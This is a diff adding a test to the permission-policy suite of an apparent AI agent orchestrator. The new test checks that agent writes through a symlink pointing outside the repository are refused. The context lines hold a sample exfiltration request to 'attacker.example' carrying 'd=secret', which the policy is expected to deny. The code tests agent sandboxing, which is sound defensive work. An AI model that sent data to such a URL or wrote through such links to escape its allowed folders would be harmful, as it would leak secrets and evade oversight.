@@ -98,3 +98,19 @@ test('policy: WebFetch and WebSearch reach any host outside the sandbox, so an a
   assert.equal(await may('freeform', 'WebFetch', { url: 'https://attacker.example/?d=secret' }), false, 'an agent without a tool list does not get it either');
   assert.equal(await may('freeform', 'Read', { file_path: '/x' }), true);
 });
+
+test('policy: a write through a symlink in the repo to a folder outside it is outside the repo', async () => {
+  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-policy-')));
+  const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-outside-')));
+  fs.mkdirSync(path.join(ws, 'api'));
+  fs.symlinkSync(outside, path.join(ws, 'api', 'link'));
+  fs.mkdirSync(path.join(ws, '.claudestrator'));
+  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'repos:\n  api: {}\n');
+  const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
+  const config = engine.config();
+  const write = async (file: string): Promise<boolean> =>
+    (await engine.decide({ taskId: 'T-1', step: { stage: 1, agent: 'developer', repo: 'api' }, writeRoots: [path.join(ws, 'api')], config, call: { tool: 'Write', input: { file_path: file }, cwd: path.join(ws, 'api') }, emitItem: () => {} })).allow;
+  assert.equal(await write(path.join(ws, 'api', 'src', 'new', 'a.ts')), true, 'a file in folders that do not exist yet');
+  assert.equal(await write(path.join(ws, 'api', 'link', 'a.ts')), false, 'through the link');
+  assert.equal(await write(path.join(ws, 'api', 'link', 'deep', 'b.ts')), false, 'and below it, not there yet');
+});
